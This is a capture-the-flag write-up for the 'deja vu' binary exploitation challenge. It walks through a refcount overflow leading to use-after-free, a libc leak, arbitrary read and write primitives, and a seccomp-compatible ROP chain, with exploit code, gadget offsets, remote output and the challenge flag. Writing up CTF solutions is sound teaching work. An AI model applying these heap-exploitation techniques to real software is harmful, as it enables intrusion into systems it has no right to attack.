# deja vu

## Challenge Information

| Field | Value |
| --- | --- |
| Category | Binary Exploitation |
| Points | 100 |
| Author | xzhiyouu |
| Connection | `nc chal.thjcc.org 9004` |
| Handout | [`artifacts/deja_vu.zip`](artifacts/deja_vu.zip) |
| Solver | [`solve.py`](solve.py) |
| Flag | `THJCC{s0_wh1ch_AI_d1d_y0u_us3_t0_s0lv3_th1s???}` |

## Overview

The service implements a small broadcast board. A message is created in one of
eight slots and can then be subscribed to any of 512 channels. Subscriptions do
not copy the message; every slot and channel refers to the same heap object.

That design relies on a reference counter stored in a single byte. Subscribing
the same message 256 times wraps the counter back to its original value. The
slot can then be discarded, freeing the message while all 256 channel entries
still point to it.

The dangling message gives an unsorted-bin libc leak. Reallocating its
`0x40`-byte chunk as a new body turns the stale channels into arbitrary read
and write primitives. From there, the exploit leaks `environ`, finds `main`'s
saved return address, and installs a seccomp-compatible `openat`/`read`/`write`
ROP chain.

## 1. Inspecting the Handout

The archive contains the challenge binary, its exact loader and libc, a launch
script, and a local test flag:

```text
deja_vu/run.sh
deja_vu/ld-linux-x86-64.so.2
deja_vu/libc.so.6
deja_vu/deja_vu
deja_vu/flag.txt
```

The original archive has SHA-256:

```text
e6793b98f89b55121f5da98635cbbf9106ebc0596fef248901b6dd2a1854b2ec
```

The launch script ensures that the supplied glibc is used:

```sh
#!/bin/sh
exec ./ld-linux-x86-64.so.2 --library-path . ./deja_vu
```

Static triage shows a stripped x86-64 PIE with the standard modern
mitigations:

| Mitigation | State |
| --- | --- |
| PIE | Enabled |
| NX | Enabled |
| Stack canary | Enabled |
| RELRO | Full |

There is no direct shell-oriented path. The program also installs a seccomp
filter before entering its menu.

## 2. Reconstructing the Data Model

The interface exposes seven operations:

```text
1) compose      2) discard
3) subscribe    4) unsubscribe
5) replay       6) amend
7) list         0) quit
```

Reversing `compose`, `replay`, and `amend` reveals the message layout:

```c
typedef struct Message {
    char subject[0x20];
    char *body;
    size_t length;
    uint8_t references;
    char padding[7];
} Message;                         // sizeof(Message) == 0x38
```

The two global collections are:

```c
Message *slots[8];
Message *channels[512];
```

`compose` allocates the body first and then allocates the `0x38`-byte message.
The allocator rounds the message request to a `0x40`-byte heap chunk.

The ownership rules are straightforward:

```c
compose:     message->references = 1;
subscribe:   channels[n] = message; message->references++;
discard:     slots[n] = NULL;       release(message);
unsubscribe: channels[n] = NULL;    release(message);
```

The release helper decrements the counter and frees both allocations only when
the new value is zero:

```c
void release(Message *message) {
    message->references--;
    if (message->references == 0) {
        free(message->body);
        free(message);
    }
}
```

## 3. Triggering the Reference-Count Overflow

The reference counter is an unsigned byte, but the program permits 512 channel
subscriptions. No overflow check is performed.

A newly composed message starts with a count of one. Subscribing it to channels
0 through 255 increments the byte 256 times:

```text
(1 + 256) mod 256 = 1
```

Discarding the original slot then decrements the value from one to zero. The
body and message are freed even though 256 channel pointers still reference
the message:

```python
board.compose(0, 0x500, b"victim", b"V" * 0x500)
board.subscribe_many(0, range(256))
board.discard(0)
```

Every occupied channel is now a use-after-free alias.

The solver sends the 256 deterministic subscription commands as one batch.
This avoids hundreds of network round trips and stays within the remote
service's connection lifetime.

## 4. Leaking libc Through the Unsorted Bin

The victim body is `0x500` bytes. Its resulting `0x510`-byte chunk is larger
than glibc's tcache maximum, so freeing it places it in the unsorted bin. The
freed `Message` itself goes into the `0x40` tcache bin.

Freeing the message only replaces the first two words of its user area with
tcache metadata. Its body pointer at offset `0x20` and length at offset `0x28`
remain intact. A stale channel therefore still performs:

```c
write(1, dangling_message->body, dangling_message->length);
```

Replaying channel 1 returns the freed large body. Its first two words are the
unsorted-bin `fd` and `bk` pointers, both pointing to `main_arena + 0x60`:

```python
leak = board.replay(1, 0x500)
arena_pointer = u64(leak[:8])
libc_base = arena_pointer - 0x21ace0
```

For the bundled Ubuntu glibc 2.35, the runtime offset is `0x21ace0`. The final
read/write `PT_LOAD` segment has a virtual address `0x1000` above its file
offset, which is why using the apparent file offset `0x219ce0` would be wrong.

A successful run produces a page-aligned base, for example:

```text
unsorted fd = 0x7806bc7f4ce0
libc base  = 0x7806bc5da000
```

## 5. Turning the UAF Into Arbitrary Read and Write

The freed `Message` occupies the head of the `0x40` tcache bin. Composing a new
message with a `0x38`-byte body causes the first `malloc(0x38)` to reclaim that
exact chunk as body storage:

```python
board.compose(0, 0x38, b"controller", forge_message(0, 8))
```

The bytes supplied as the new body are simultaneously interpreted as the old
message fields by every dangling channel. The solver uses this helper to forge
those fields:

```python
def forge_message(address, length, refcount=0x80):
    return (
        b"F" * 0x20
        + p64(address)
        + p64(length)
        + bytes([refcount])
        + b"\0" * 7
    )
```

One stale channel must be converted into a stable controller. The forged
reference count is set to `0x80`, allowing channel 0 to be unsubscribed without
freeing anything. The newly composed message is then subscribed into that
empty channel:

```python
board.unsubscribe(0)   # forged 0x80 becomes 0x7f
board.subscribe(0, 0)  # channel 0 now references the real new Message
```

The resulting roles are:

- channel 0 references the legitimate controller message;
- the controller's body is the reclaimed old `Message` chunk;
- channel 1 remains a dangling pointer to that reclaimed chunk.

Amending channel 0 rewrites the fake body pointer and length seen by channel 1.
Replaying or amending channel 1 then reads or writes the selected address:

```python
def arbitrary_read(address, size):
    board.amend(0, forge_message(address, size))
    return board.replay(1, size)

def arbitrary_write(address, data):
    board.amend(0, forge_message(address, len(data)))
    board.amend(1, data)
```

This primitive does not require a heap leak. The legitimate controller already
contains the correct pointer to the reclaimed chunk.

## 6. Respecting the Seccomp Policy

The binary builds an allowlist from eleven x86-64 syscall numbers:

```text
0, 1, 2, 257, 3, 8, 5, 262, 12, 60, 231
```

They correspond to:

```text
read, write, open, openat, close, lseek, fstat,
newfstatat, brk, exit, exit_group
```

`execve` is unavailable, so a `system("/bin/sh")` chain would be killed by
seccomp. The intended post-exploitation path is file-oriented ROP:

```text
openat(AT_FDCWD, "/flag", O_RDONLY)
read(returned_fd, stack_buffer, 0x80)
write(STDOUT_FILENO, stack_buffer, 0x80)
```

## 7. Locating the Return Address

The libc leak gives access to the exported `environ` pointer at offset
`0x222200`:

```python
stack = u64(arbitrary_read(libc_base + 0x222200, 8))
```

The solver dumps `0x800` bytes below that address and searches for a qword equal
to `libc_base + 0x29d90`. Disassembly shows that `0x29d90` is the instruction
immediately following libc's indirect call to `main`:

```asm
call rax        ; main(argc, argv, envp)
mov  edi, eax   ; libc + 0x29d90
call exit
```

That qword is therefore `main`'s live saved return address. Searching for its
known value is more reliable than assuming a fixed distance from `environ`:

```python
saved_rips = [
    stack_start + offset
    for offset in range(0, len(stack_dump), 8)
    if u64(stack_dump[offset:offset + 8])
       == libc_base + LIBC_START_CALL_MAIN_RET
]
```

## 8. Building the ORW Chain

The required gadget and function offsets in the bundled libc are:

| Purpose | Offset |
| --- | ---: |
| `pop rdi; ret` | `0x2a3e5` |
| `pop rsi; ret` | `0x2be51` |
| `pop rdx; pop r12; ret` | `0x11f327` |
| `xchg eax, edi; ret` | `0x164f5e` |
| `ret` | `0x29cd6` |
| `openat` | `0x1146b0` |
| `read` | `0x114810` |
| `write` | `0x1148b0` |
| `_exit` | `0xeabc0` |

The return value of `openat` cannot safely be assumed to be file descriptor 3.
The remote wrapper may inherit additional descriptors. The overlapping gadget
at `0x164f5e` transfers the returned descriptor from `eax` to `edi`:

```asm
xchg eax, edi
ret
```

The next `read` therefore always uses the descriptor actually returned by
`openat`. A standalone `ret` preserves stack alignment before entering the
libc wrapper.

The finished payload overwrites only the saved return address and the stack
above it. Selecting `quit` leaves the canary untouched, runs the normal
epilogue, and returns directly into the ORW chain:

```python
arbitrary_write(saved_rip, payload)
board.quit()
```

The handout keeps its local placeholder in `flag.txt`, while the remote service
mounts the real flag at `/flag`. The solver uses `/flag` by default. Its
repeatable `--path` option can target a different path if the deployment layout
is changed:

```sh
python3 solve.py --path ./flag.txt --path /flag
```

## 9. Running the Exploit

The solver uses only the Python standard library:

```sh
python3 solve.py
```

Relevant output from the verified remote run:

```text
unsorted fd = 0x7806bc7f4ce0
libc base  = 0x7806bc5da000
environ    = 0x7fff20cae228
saved RIP   = 0x7fff20cae108
flag        = THJCC{s0_wh1ch_AI_d1d_y0u_us3_t0_s0lv3_th1s???}
```

The addresses change on every connection because both PIE and ASLR are active.
The exploit derives all of them at runtime.

## Flag

```text
THJCC{s0_wh1ch_AI_d1d_y0u_us3_t0_s0lv3_th1s???}
```
